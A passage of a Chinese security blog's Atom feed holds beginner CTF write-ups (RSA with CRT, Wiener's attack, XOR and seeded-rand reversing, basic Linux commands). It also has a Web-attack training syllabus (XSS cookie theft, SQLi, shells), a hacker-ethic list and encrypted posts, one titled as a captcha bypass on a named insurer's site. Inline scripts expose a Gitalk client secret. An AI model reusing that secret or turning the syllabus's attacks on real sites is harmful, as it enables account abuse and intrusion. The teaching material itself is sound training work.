class="number">95272795986475189505518980251137003509292621140166383887854853863720692420204142448424074834657149326853553097626486371206617513769930277580823116437975487148956107509247564965652417450550680181691869432067892028368985007229633943149091684419834136214793476910417359537696632874045272326665036717324623992885</span></span><br><span class="line">p = <span class="number">11387480584909854985125335848240384226653929942757756384489381242206157197986555243995335158328781970310603060671486688856263776452654268043936036556215243</span></span><br><span class="line">q = <span class="number">12972222875218086547425818961477257915105515705982283726851833508079600460542479267972050216838604649742870515200462359007315431848784163790312424462439629</span></span><br><span class="line">dp = <span class="number">8191957726161111880866028229950166742224147653136894248088678244548815086744810656765529876284622829884409590596114090872889522887052772791407131880103961</span></span><br><span class="line">dq = <span class="number">3570695757580148093370242608506191464756425954703930236924583065811730548932270595568088372441809535917032142349986828862994856575730078580414026791444659</span></span><br><span class="line"></span><br><span class="line">qinv = modinv(q, p)</span><br><span class="line">m1 = pow(c, dp, p)</span><br><span class="line">m2 = pow(c, dq, q)</span><br><span class="line">h = (qinv * (m1 - m2)) % p</span><br><span class="line">m = m2 + h * q</span><br><span class="line">m_hex = str(hex(m))[<span class="number">2</span>:<span class="number">-1</span>]</span><br><span class="line"><span class="keyword">print</span> <span class="string">''</span>.join([chr(int(<span class="string">''</span>.join(c), <span class="number">16</span>)) <span class="keyword">for</span> c <span class="keyword">in</span> zip(m_hex[<span class="number">0</span>::<span class="number">2</span>], m_hex[<span class="number">1</span>::<span class="number">2</span>])])</span><br></pre></td></tr></table></figure><p>最后结果为<br>Theres_more_than_one_way_to_RSA</p><blockquote><p>flag{Theres_more_than_one_way_to_RSA}</p></blockquote><hr><h2 id="RSA3"><a href="#RSA3" class="headerlink" title="RSA3"></a>RSA3</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Normally, you pick e and generate d from that. What appears to have happened in this case? What is likely about the size of d?</span><br><span class="line"></span><br><span class="line">Update: Fixed bug of flag.</span><br><span class="line"></span><br><span class="line">Notice: Please DO NOT use any RSA tools, solve this challenge by yourself.</span><br><span class="line"></span><br><span class="line">e &#x3D; 165528674684553774754161107952508373110624366523537426971950721796143115780129435315899759675151336726943047090419484833345443949104434072639959175019000332954933802344468968633829926100061874628202284567388558408274913523076548466524630414081156553457145524778651651092522168245814433643807177041677885126141</span><br><span class="line">n &#x3D; 380654536359671023755976891498668045392440824270475526144618987828344270045182740160077144588766610702530210398859909208327353118643014342338185873507801667054475298636689473117890228196755174002229463306397132008619636921625801645435089242900101841738546712222819150058222758938346094596787521134065656721069</span><br><span class="line">c &#x3D; 169391604307213974710597693248166863262635321820709182280694059296079676696460036420655604420049971304712550027666676719989641872790226627271230072009450546099425697330508459430999175828530558172413805218170859212369467798719828240031394421896121823803700024559680572528969880625457942316782819682826344683732</span><br></pre></td></tr></table></figure><p>如果硬刚这到题的话，尝试直接分解n，可以发现n是非常难分解的，但是题目描述中重点强调了d的大小，那么可能和<a href="https://en.wikipedia.org/wiki/Wiener%27s_attack" target="_blank" rel="noopener">Wiener’s Attack</a>有关</p><p>当<strong>d &lt; 1/3 * N ^ (1/4)</strong> 时，可以用Wiener’s Attack获取私钥d</p><p>在生成私钥的时候，d是根据e而获得的，当e过大或者过小的话，可以利用低解密指数攻击快速分解n，获得d和m。具体算法以及证明过程见<a href="https://www.tr0y.wang/2017/11/06/CTFRSA/index.html#%E4%BD%8E%E8%A7%A3%E5%AF%86%E6%8C%87%E6%95%B0%E6%94%BB%E5%87%BB" target="_blank" rel="noopener">低解密指数攻击</a></p><blockquote><p>flag{Are_any_RSA_vals_good_87768438250}</p></blockquote><!--nextpage--><h1 id="REVERSE"><a href="#REVERSE" class="headerlink" title="REVERSE"></a>REVERSE</h1><h2 id="what-is-IDA-150"><a href="#what-is-IDA-150" class="headerlink" title="what is IDA? (150)"></a>what is IDA? (150)</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">我有一个exe，你能找到flag吗?</span><br><span class="line"></span><br><span class="line">提示： IDA pro 6.8以上版本</span><br></pre></td></tr></table></figure><p>下载一个IDA pro，用IDA(64位)载入该程序<br>反汇编main函数，只有个Ha Ha Ha<br><img src="/2018/10/10/BlueWhale2018%E5%B9%B4%E7%BA%B3%E6%96%B0%E9%A2%98%E7%9B%AEWriteup/TIM%E6%88%AA%E5%9B%BE20180911213232.png" alt><br>直接搜索字符串“flag”<br><img src="/2018/10/10/BlueWhale2018%E5%B9%B4%E7%BA%B3%E6%96%B0%E9%A2%98%E7%9B%AEWriteup/TIM%E6%88%AA%E5%9B%BE20180911213408.png" alt></p><blockquote><p>flag{can_y0u_see_me}</p></blockquote><hr><h2 id="Xor-180"><a href="#Xor-180" class="headerlink" title="Xor (180)"></a>Xor (180)</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">flag就在文件里，为什么没有看到？</span><br><span class="line"></span><br><span class="line">注：异或运算</span><br></pre></td></tr></table></figure><p>用IDA载入开始逆向程序，直接逆向main函数，得到源码如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax@10</span></span><br><span class="line">  __int64 v4; <span class="comment">// rsi@10</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> i; <span class="comment">// [sp+Ch] [bp-34h]@1</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> j; <span class="comment">// [sp+Ch] [bp-34h]@4</span></span><br><span class="line">  <span class="keyword">char</span> v7[<span class="number">40</span>]; <span class="comment">// [sp+10h] [bp-30h]@1</span></span><br><span class="line">  __int64 v8; <span class="comment">// [sp+38h] [bp-8h]@1</span></span><br><span class="line"></span><br><span class="line">  v8 = *MK_FP(__FS__, <span class="number">40L</span>L);</span><br><span class="line">  __isoc99_scanf(&amp;unk_8B4, v7, envp);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i</span><br></pre></td></tr></table></figure><p>直接定位到第16行，不管v7是什么，它会和flag数组做一个对比，如果不一样就错误，所以flag数组里就放着flag，双击flag数组跳转<br><img src="/2018/10/10/BlueWhale2018%E5%B9%B4%E7%BA%B3%E6%96%B0%E9%A2%98%E7%9B%AEWriteup/TIM%E6%88%AA%E5%9B%BE20180911213924.png" alt><br>可以看到flag就放在这里，不过是以16进制，先把数据复制出来，再接着回去看上面的代码<br><img src="/2018/10/10/BlueWhale2018%E5%B9%B4%E7%BA%B3%E6%96%B0%E9%A2%98%E7%9B%AEWriteup/TIM%E6%88%AA%E5%9B%BE20180911214704.png" alt><br>可以看到flag长度为22，并且每个字符都和对应的0到21做了异或，由于异或是可逆的，因此将刚才复制出来的flag中每个字符都在异或一次即可</p><blockquote><p>flag{yes_you_know_Xor}</p></blockquote><hr><h2 id="Random"><a href="#Random" class="headerlink" title="Random"></a>Random</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Can a computer generate a truly random number?</span><br></pre></td></tr></table></figure><p>首先拖进IDA逆向main函数，需要使check()返回非0，另外可以看到flag的长度为32<br><img src="/2018/10/10/BlueWhale2018%E5%B9%B4%E7%BA%B3%E6%96%B0%E9%A2%98%E7%9B%AEWriteup/TIM%E6%88%AA%E5%9B%BE20180924162538.png" alt></p><p>跟进check函数，可以发现程序对输入的字符串做了4件事<img src="/2018/10/10/BlueWhale2018%E5%B9%B4%E7%BA%B3%E6%96%B0%E9%A2%98%E7%9B%AEWriteup/TIM%E6%88%AA%E5%9B%BE20180924162749.png" alt></p><ol><li>给rand函数播种，种子为0xDEADBEEF，由于种子是固定的，所以random函数输出的随机数序列是固定的</li><li>将输入字符串按字节加<code>random() mod 0x40</code></li><li>将上一步的字符串按字节异或<code>random() mod 0x100</code></li><li>检查上述步骤完成后的字符串是否和byte_601080数组相等，其中byte_601080数组为<br><img src="/2018/10/10/BlueWhale2018%E5%B9%B4%E7%BA%B3%E6%96%B0%E9%A2%98%E7%9B%AEWriteup/TIM%E6%88%AA%E5%9B%BE20180924163232.png" alt></li></ol><p>根据提示了解一下相关的资料就可以知道，glibc 的 <code>random()</code> 的实现使用线性同余引擎，在种子一定的情况下，会产生固定的伪随机序列。</p><p>所以只需要自己写个程序，设定种子为<code>0xdeadbeef</code>，就可以<code>random()</code>到相同的随机数，然后根据验证过程逆推即可得到flag。</p><blockquote><p>flag{R4nd0m_1s_P5euDo_randomW0W}</p></blockquote><hr><h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="Welcome-50"><a href="#Welcome-50" class="headerlink" title="Welcome (50)"></a>Welcome (50)</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">欢迎来到Blue-Whale纳新平台</span><br><span class="line">下面的这个东西叫做flag：</span><br><span class="line">flag&#123;Welcome_to_join_us&#125;</span><br><span class="line">所有题目的答案都是以上这个形式</span><br><span class="line">比如这题，把这个复制到答案框就好了</span><br></pre></td></tr></table></figure><p>签到题，直接复制粘贴</p><blockquote><p>flag{Welcome_to_join_us}</p></blockquote><hr><h2 id="what-is-VM-100"><a href="#what-is-VM-100" class="headerlink" title="what is VM (100)"></a>what is VM (100)</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">你知道虚拟机吗？</span><br><span class="line">我这里有一个VMware虚拟机镜像，怎么打开它呢？</span><br><span class="line">提示：下载VMware14：</span><br><span class="line">https:&#x2F;&#x2F;www.vmware.com&#x2F;products&#x2F;workstation-pro&#x2F;workstation-pro-evaluation.html</span><br><span class="line"></span><br><span class="line">镜像链接: https:&#x2F;&#x2F;pan.baidu.com&#x2F;s&#x2F;1uy0PkjE1Ik4xzklreg9ICQ</span><br><span class="line">密码: vxwg</span><br><span class="line"></span><br><span class="line">虚拟机：</span><br><span class="line">用户名：abc</span><br><span class="line">密码： 123456</span><br><span class="line"></span><br><span class="line">注意检查CPU虚拟化是否打开，没有打开的要在BIOS里打开。</span><br></pre></td></tr></table></figure><p>下载安装VM14，打开下载的题目中的虚拟机<br><img src="/2018/10/10/BlueWhale2018%E5%B9%B4%E7%BA%B3%E6%96%B0%E9%A2%98%E7%9B%AEWriteup/TIM%E6%88%AA%E5%9B%BE20180917224924.png" alt><br><img src="/2018/10/10/BlueWhale2018%E5%B9%B4%E7%BA%B3%E6%96%B0%E9%A2%98%E7%9B%AEWriteup/TIM%E6%88%AA%E5%9B%BE20180917225713.png" alt><br>之后开启虚拟机，用题目给的用户名和密码登录，登陆后桌面上就是一个flag<br><img src="/2018/10/10/BlueWhale2018%E5%B9%B4%E7%BA%B3%E6%96%B0%E9%A2%98%E7%9B%AEWriteup/TIM%E6%88%AA%E5%9B%BE20180919213440.png" alt></p><blockquote><p>flag{you_know_how_to_use_VM}</p></blockquote><hr><h2 id="what-is-command-100"><a href="#what-is-command-100" class="headerlink" title="what is command (100)"></a>what is command (100)</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">home目录下有一个flag文件，怎么用命令找到它呢？</span><br><span class="line"></span><br><span class="line">注：此题Linux镜像为第二题镜像</span><br></pre></td></tr></table></figure><p>因为flag是隐藏文件，直接用<code>ls</code>命令是找不到的，得用<code>ls -al</code>命令显示所有文件，之后用<code>cat</code>命令打开即可<br><img src="/2018/10/10/BlueWhale2018%E5%B9%B4%E7%BA%B3%E6%96%B0%E9%A2%98%E7%9B%AEWriteup/TIM%E6%88%AA%E5%9B%BE20180919213746.png" alt></p><blockquote><p>flag{ls_is_what}</p></blockquote><hr><h2 id="Linux-find-100"><a href="#Linux-find-100" class="headerlink" title="Linux find (100)"></a>Linux find (100)</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">我在某个目录中藏了一个叫findme的文件，怎么能找到它呢？</span><br><span class="line"></span><br><span class="line">注：此题Linux镜像为第二题镜像</span><br></pre></td></tr></table></figure><p>直接用find命令即可<br><code>sudo find / -name findme -print</code><br><img src="/2018/10/10/BlueWhale2018%E5%B9%B4%E7%BA%B3%E6%96%B0%E9%A2%98%E7%9B%AEWriteup/TIM%E6%88%AA%E5%9B%BE20180919214153.png" alt></p><blockquote><p>flag{you_know_wh1s_f1nd}</p></blockquote><hr><h2 id="what-is-nc-100"><a href="#what-is-nc-100" class="headerlink" title="what is nc? (100)"></a>what is nc? (100)</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">linux nc命令是干什么的呢？</span><br><span class="line">nc 144.202.124.195 10001</span><br></pre></td></tr></table></figure><p>直接用nc命令<br><code>nc 144.202.124.195 10001</code><br><img src="/2018/10/10/BlueWhale2018%E5%B9%B4%E7%BA%B3%E6%96%B0%E9%A2%98%E7%9B%AEWriteup/TIM%E6%88%AA%E5%9B%BE20180919213522.png" alt></p><blockquote><p>flag{nc_1s_this}</p></blockquote><div id="gitalk-container"></div><script src="https://cdn.bootcss.com/blueimp-md5/2.12.0/js/md5.min.js"></script><link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css"><script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script><script>var gitalkConfig = {"clientID":"fb9b672afa74e328fbe8","clientSecret":"1fa3f067c53df3bd3686b004980eaca2fe8f5ede","repo":"srpopty.github.io","owner":"Srpopty","admin":["Srpopty"],"distractionFreeMode":false};    gitalkConfig.id = md5(location.pathname);var gitalk = new Gitalk(gitalkConfig);    gitalk.render("gitalk-container");    </script>]]></content>
    
    <summary type="html">
    
      BlueWhale 2018年纳新题目解析。
    
    </summary>
    
    
      <category term="ctf" scheme="https://srpopty.github.io/categories/ctf/"/>
    
    
      <category term="writeup" scheme="https://srpopty.github.io/tags/writeup/"/>
    
  </entry>
  
  <entry>
    <title>BlueWhale 2018 Web 新生培训大纲</title>
    <link href="https://srpopty.github.io/2018/09/21/BlueWhale-2018-Web-%E6%96%B0%E7%94%9F%E5%9F%B9%E8%AE%AD%E5%A4%A7%E7%BA%B2/"/>
    <id>https://srpopty.github.io/2018/09/21/BlueWhale-2018-Web-%E6%96%B0%E7%94%9F%E5%9F%B9%E8%AE%AD%E5%A4%A7%E7%BA%B2/</id>
    <published>2018-09-21T14:21:59.000Z</published>
    <updated>2020-03-11T12:39:13.806Z</updated>
    
    <content type="html"><![CDATA[<h1 id="web基础"><a href="#web基础" class="headerlink" title="web基础"></a>web基础</h1><ol><li>网络安全法</li><li>Web底层知识</li><li>Web基本知识，如何配置一台服务器（lamp、wamp），搭建一个简单的网站</li><li>Web编程语言：C（其他语言的基础，必会）、C++（视学习能力可选）、HTML、Javascript、PHP、Python（常用工具，必须掌握requests库的使用）、Java（视学习能力可选）、css、SQL</li><li>常用Web渗透的工具（nmap、BurpSuite、Wireshark等，注意不要变成Script Boy）</li><li>其他Web基础杂项，比如各种编码等</li></ol><h1 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h1><ol><li>Javascript与HTML语法的简单讲解</li><li>XSS中会用到的的一些概念，重点讲解Cookie，Session，如何设置读取Cookie，以及Cookie的权限</li><li>XSS平台的使用</li><li>XSS形成原理</li><li>XSS利用<ol><li>最简单的使用XSS窃取Cookie</li><li>怎么用XSS获取一些网页上的信息（如URL或者网页源码，甚至是剪贴板的内容，怎么弄个键盘记录器）</li><li>iframe标签跨域窃取Cookie</li><li>在过滤了某些字符的情况下如何绕过（重点）</li></ol></li><li>同源策略基本概念</li><li>CSP基本概念以及格式讲解，要求会识别每句CSP代码的意义</li><li>结合几个例子讲解在某些情况下如何绕过CSP</li><li>XSS的一些小trick</li><li>讲解如何防御XSS</li><li>讲一讲XSS蠕虫Samy（拓展知识面）</li></ol><h1 id="SQLi"><a href="#SQLi" class="headerlink" title="SQLi"></a>SQLi</h1><ol><li>数据库简介（类型：关系型、非关系型，常用数据库等）</li><li>SQL语法的简单讲解</li><li>讲解SQL注入的成因</li><li>SQL注入的一些基本概念与术语（如SQL注入类型）<ol><li>UNION 联合查询、多语句查询</li><li>直接显示数据</li><li>报错显示数据</li><li>盲注获取数据</li></ol></li><li>SQL盲注（盲注的概念、分类：基于报错，基于时间延迟，基于boolean）</li><li>通过SQL获取数据的方法与算法（暴力猜解、二分法、按位查询等）</li><li>SQL注入中常用到的Payload（主要以Mysql为例，但是不同数据库语法略有不用，也可以讲讲其他数据库的payload，不过万变不离其宗）<ol><li>获取库名</li><li>获取表名</li><li>获取列名</li><li>获取数据</li><li>利用SQL注入读写文件</li><li>某些数据库如何利用SQL注入获取shell（视新生接受能力选讲）</li></ol></li><li>SQL注入的一些其他的小trick</li><li>nosql注入</li><li>SQL注入中常会遇到的过滤手段，如何绕过（重点）</li><li>SQLMap的基本使用（避免形成依赖）</li><li>如何防御SQL注入（目前常用的防御SQL注入的方法，PHP、Flask、Django与JavaWeb是如何防御SQL注入的）</li></ol><h1 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h1><ol><li>PHP介绍与语法的简单讲解</li><li>某些情况下PHP弱类型造成的漏洞<ol><li>== 与 ===</li><li>MD5等哈希函数的弱类型比较</li><li>in_array的弱类型比较</li><li>这类内容太多了，讲明白根本原理就行</li></ol></li><li>PHP某些古怪的特性造成的漏洞<ol><li>如GET、POST数组等</li></ol></li><li>PHP中某些函数的漏洞</li><li>常见的PHP文件包含漏洞与绕过方法</li><li>常见的PHP文件上传漏洞与绕过方法</li><li>PHP反序列化漏洞<ol><li>反序列化成因</li><li>PHP的面向对象</li><li>PHP中的Magic函数</li><li>PHP某个反序列化时的CVE</li><li>PHP反序列化的高级利用，POP链等</li></ol></li><li>PHP中伪随机数的预测</li><li>mt_rand漏洞</li><li>rand预测</li><li>PHP的一些其他的小trick、CVE等<br>注：请注意不同的PHP版本的漏洞不同</li></ol><h1 id="Python与Java-Web"><a href="#Python与Java-Web" class="headerlink" title="Python与Java Web"></a>Python与Java Web</h1><ol><li>Python格式化字符串漏洞</li><li>Python反序列化漏洞</li><li>SSTI漏洞<ol><li>成因</li><li>利用</li><li>常用Payload</li><li>防御</li></ol></li><li>Python小trick（Python黑魔法）</li><li>Python沙箱绕过</li><li>Python的一些CVE</li><li>JavaWeb的一些CVE讲解，如Java反序列化漏洞、Status的漏洞等</li></ol><h1 id="CSRF与SSRF"><a href="#CSRF与SSRF" class="headerlink" title="CSRF与SSRF"></a>CSRF与SSRF</h1><ol><li>CSRF的成因与危害</li><li>CSRF绕过</li><li>CSRF的利用与防御</li><li>SSRF的成因与危害</li><li>SSRF利用<ol><li>内网探测</li><li>端口探测</li><li>与CRLF综合利用</li></ol></li><li>SSRF与URL跳转的绕过方法</li><li>SSRF的防御</li></ol><h1 id="流量审计与Web杂项"><a href="#流量审计与Web杂项" class="headerlink" title="流量审计与Web杂项"></a>流量审计与Web杂项</h1><ol><li><p>流量审计</p><ol><li>Wireshark的详细使用技巧</li><li>过滤表达式</li><li>协议类型</li><li>如何导出抓到的感兴趣的东西</li><li>如何在Wireshark中快速定位到我们所关注的包</li><li>Wireshark的统计技巧</li><li>命令行Tshark的使用以及TCPdump与ngrep的使用</li></ol></li><li><p>Web杂项</p><ol><li>命令、代码注入，RCE</li><li>源码泄露（如git、svn等等）</li><li>逻辑漏洞（如越权等）</li><li>XXE<ol><li>成因</li><li>利用</li><li>防御</li></ol></li><li>nginx的一些漏洞（配置错误导致的漏洞，如目录穿越等）</li></ol></li></ol><h1 id="CTF题目选讲与知识总结"><a href="#CTF题目选讲与知识总结" class="headerlink" title="CTF题目选讲与知识总结"></a>CTF题目选讲与知识总结</h1><h1 id="无线渗透"><a href="#无线渗透" class="headerlink" title="无线渗透"></a>无线渗透</h1><h1 id="Web综合渗透"><a href="#Web综合渗透" class="headerlink" title="Web综合渗透"></a>Web综合渗透</h1><div id="gitalk-container"></div><script src="https://cdn.bootcss.com/blueimp-md5/2.12.0/js/md5.min.js"></script><link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css"><script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script><script>var gitalkConfig = {"clientID":"fb9b672afa74e328fbe8","clientSecret":"1fa3f067c53df3bd3686b004980eaca2fe8f5ede","repo":"srpopty.github.io","owner":"Srpopty","admin":["Srpopty"],"distractionFreeMode":false};    gitalkConfig.id = md5(location.pathname);var gitalk = new Gitalk(gitalkConfig);    gitalk.render("gitalk-container");    </script>]]></content>
    
    <summary type="html">
    
      BlueWhale 2018级新生Web培训纲要。
    
    </summary>
    
    
      <category term="hack" scheme="https://srpopty.github.io/categories/hack/"/>
    
    
  </entry>
  
  <entry>
    <title>Hacker Ethic</title>
    <link href="https://srpopty.github.io/2018/09/21/Hacker-Ethic/"/>
    <id>https://srpopty.github.io/2018/09/21/Hacker-Ethic/</id>
    <published>2018-09-21T01:49:12.000Z</published>
    <updated>2020-03-11T13:20:27.463Z</updated>
    
    <content type="html"><![CDATA[<ol><li><p>Acess to computers–and anything that might teach you something about the way the world works–should be unlimited and total. Always yield to the Hands-On Imperative!</p></li><li><p>All information should be free.</p></li><li><p>Mistrust Authority–Promote Decentralization.</p></li><li><p>Hackers should bt judged by their hacking, not bogus criteria such as degrees, age, race, or position.</p></li><li><p>You can create art and beauty on a computer.</p></li><li><p>Computers can change your life for the better.</p></li></ol><div id="gitalk-container"></div><script src="https://cdn.bootcss.com/blueimp-md5/2.12.0/js/md5.min.js"></script><link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css"><script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script><script>var gitalkConfig = {"clientID":"fb9b672afa74e328fbe8","clientSecret":"1fa3f067c53df3bd3686b004980eaca2fe8f5ede","repo":"srpopty.github.io","owner":"Srpopty","admin":["Srpopty"],"distractionFreeMode":false};    gitalkConfig.id = md5(location.pathname);var gitalk = new Gitalk(gitalkConfig);    gitalk.render("gitalk-container");    </script>]]></content>
    
    <summary type="html">
    
      Hackers, Heroes of the Computer Revolution
    
    </summary>
    
    
      <category term="life" scheme="https://srpopty.github.io/categories/life/"/>
    
    
      <category term="think" scheme="https://srpopty.github.io/tags/think/"/>
    
  </entry>
  
  <entry>
    <title>Nothing</title>
    <link href="https://srpopty.github.io/2018/08/29/Nothing/"/>
    <id>https://srpopty.github.io/2018/08/29/Nothing/</id>
    <published>2018-08-29T09:12:10.000Z</published>
    <updated>2020-03-11T12:32:18.664Z</updated>
    
    <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Wrong password!" data-whm="Wrong password hash!"><div class="hbe-input-container"><input type="password" id="hbePass" placeholder="Enter password here." /><label>Enter password here.</label><div class="bottom-line"></div></div><script id="hbeData" type="hbeData" data-hmacdigest="d47e006c085c9613786b3e332bc4ed63bd2b4e36ddcbf41725eb979804b9348d">9cdc29988dbce050e8c9b2504068f135e36a4aef8c10fb6f17a718150fdcd6717e5256063068581ba6d915ef911faf67e8de784ac0f3fe853e360faaa025e390ca07eff416bed152a2332f17c25fd201ae95fb96b30a0cbefa6331bab33e66971e88a14aa36308f19f4b7158c94715a772f5c2aa61d1ee649c8506fb9b78bce0f42aa63aa55b0866bd3877a8494e9dca7e15a4a5eebc7069015830a85199fa7f6dadc6738107c815e81b79caec36bda81b68a5a24d76669473bf5e28fbeb3099ac199bcf0cb0690edc77472b05dd545937b385bf38eb03e9affde60d72c53a9517b858dc2dd158477dbfd1b5e9ad4f7ae8e9318b60bd88e52f6a667571d745a9b9ca019c58ff85cd63536247ee333458bbcd7f44ec334d18ffe905da23fef36e69bcdc30a8269373b5813d15df811fc4fe7d636f9bee3af98675f19f93630bab378335e564aca0352a8fe4cb2917117f0bf76b8d1bb666e665aff4dda50b5c5a316f5d7f58b6ab7c13d4082acbab7902341cc2ead383d37390f14b40d67c8d8369b85748f32860572b1748b6171827a1f2a57a599737ac116f6e101af390b2f3cfc9cf2d2e1afb1ea3909f87e31775b67b2ef2ddc7cc54723f78335d0c09bb508ba5ed0b86cba60194602e91900323b57bd77b06a98989e9da2951a1e2016db6c8ac8a7bc0517d776836f43083e34fe74dc48d961cc556e7305174acfcb42f1e98f822e5d6e4e23e26aa4337241a26b701663496803eb2de6b2333c1ad4c90f0e53ce6d7c386fc571263a14fc4f9526ba3e8ff036be78eea4bb6a3107dbd75432d3df35758af63b34f1900b401d413813c433d0a45f93b8d41fc7330e1a2294648ecddc0cffff0cc0e23bde19a54628eb778dcb334b2271e672844a85c511bc148bdfd76df3ba3941ce3373d25ecf16f57ca8228d892198c4aa15ca982e6892a0616d39d56dca2e7973aa5f5c111fc99334345969806cba3d408d4b17f56d6c19a775a701c99dc76315d413ed4aa5d47f6cdef9ec132297758188b20d6510d31</script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      ...
    
    </summary>
    
    
      <category term="life" scheme="https://srpopty.github.io/categories/life/"/>
    
    
      <category term="think" scheme="https://srpopty.github.io/tags/think/"/>
    
  </entry>
  
  <entry>
    <title>百年人寿保险股份有限公司网站表单验证码绕过</title>
    <link href="https://srpopty.github.io/2018/07/27/%E7%99%BE%E5%B9%B4%E4%BA%BA%E5%AF%BF%E4%BF%9D%E9%99%A9%E8%82%A1%E4%BB%BD%E6%9C%89%E9%99%90%E5%85%AC%E5%8F%B8%E7%BD%91%E7%AB%99%E8%A1%A8%E5%8D%95%E9%AA%8C%E8%AF%81%E7%A0%81%E7%BB%95%E8%BF%87/"/>
    <id>https://srpopty.github.io/2018/07/27/%E7%99%BE%E5%B9%B4%E4%BA%BA%E5%AF%BF%E4%BF%9D%E9%99%A9%E8%82%A1%E4%BB%BD%E6%9C%89%E9%99%90%E5%85%AC%E5%8F%B8%E7%BD%91%E7%AB%99%E8%A1%A8%E5%8D%95%E9%AA%8C%E8%AF%81%E7%A0%81%E7%BB%95%E8%BF%87/</id>
    <published>2018-07-27T09:42:32.000Z</published>
    <updated>2020-03-11T12:37:04.568Z</updated>
    
    <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Wrong password!" data-whm="Wrong password hash!"><div class="hbe-input-container"><input type="password" id="hbePass" placeholder="Enter password here." /><label>Enter password here.</label><div class="bottom-line"></div></div><script id="hbeData" type="hbeData" data-hmacdigest="a46dcf09f216dc99d292e7f3964154a56e58a864ad1b12cdb4a42bf9077434f5"></script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      百年人寿保险股份有限公司官网登陆表单验证码绕过方法。
    
    </summary>
    
    
      <category term="hack" scheme="https://srpopty.github.io/categories/hack/"/>
    
    
      <category term="vulnerability" scheme="https://srpopty.github.io/tags/vulnerability/"/>
    
  </entry>
  
  <entry>
    <title>QCTF2018 Confusion Writeup</title>
    <link href="https://srpopty.github.io/2018/07/16/QCTF2018-Confusion-Writeup/"/>
    <id>https://srpopty.github.io/2018/07/16/QCTF2018-Confusion-Writeup/</id>
    <published>2018-07-16T02:20:46.000Z</published>
    <updated>2020-03-11T13:28:36.400Z</updated>
    
